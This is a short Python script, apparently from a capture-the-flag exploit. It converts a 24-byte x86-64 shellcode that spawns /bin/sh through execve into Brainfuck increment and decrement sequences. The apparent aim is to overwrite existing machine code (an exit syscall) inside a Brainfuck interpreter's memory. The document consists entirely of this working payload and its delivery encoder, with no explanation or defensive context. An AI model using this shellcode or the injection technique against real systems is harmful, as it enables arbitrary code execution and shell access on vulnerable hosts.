# Initial memory values (from your provided byte sequence)
initial_values = [
    0xB8, 0x3C, 0x00, 0x00, 0x00, 0x31, 0xFF, 0x0F,
    0x05, 0xE9, 0x64, 0xFF, 0xFF, 0xFF, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
]

# New desired shellcode values (from the provided shellcode)
desired_shellcode = [
    0x31, 0xF6, 0x48, 0xBF, 0xD1, 0x9D, 0x96, 0x91,
    0xD0, 0x8C, 0x97, 0xFF, 0x48, 0xF7, 0xDF, 0xF7,
    0xE6, 0x04, 0x3B, 0x57, 0x54, 0x5F, 0x0F, 0x05
]

def calculate_brainfuck_code(initial, desired):
    brainfuck_code = []
    
    for i in range(len(initial)):
        delta = desired[i] - initial[i]
        if delta > 0:
            brainfuck_code.append('+' * delta)  # Increase the value to the desired one
        elif delta < 0:
            brainfuck_code.append('-' * abs(delta))  # Decrease the value to the desired one
        brainfuck_code.append('.>')  # Output the byte value
    
    return ''.join(brainfuck_code)

# Generate the Brainfuck code
brainfuck_code = calculate_brainfuck_code(initial_values, desired_shellcode)

# Print the resulting Brainfuck code
print(brainfuck_code)
